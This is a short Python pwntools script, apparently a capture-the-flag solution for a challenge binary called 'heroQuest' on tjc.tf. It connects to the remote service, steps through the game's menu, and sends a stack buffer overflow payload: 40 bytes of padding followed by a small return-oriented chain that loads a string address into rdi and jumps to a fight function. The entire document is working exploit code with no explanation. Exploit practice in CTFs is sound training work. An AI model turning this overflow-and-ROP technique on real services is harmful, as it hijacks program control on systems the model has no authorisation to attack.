from pwn import *

#p = process('./heroQuest')
p = remote('tjc.tf',31365)

p.sendline(b'finalBoss\x00')
p.recvuntil(b'To the north is a forest, the east a castle, the south a desert, and the west a village.')
p.sendline(b'w')
p.recvuntil(b'back ')
p.sendline(b'r')
p.recvuntil(b'Enter the name for your save file: ')

fight = p64(0x00000000004014db)
pop_rdi = p64(0x00000000004017ab)
boss = p64(0x4040a0)


payload = b"A"*40 + pop_rdi + boss + fight
p.sendline(payload)
p.interactive()
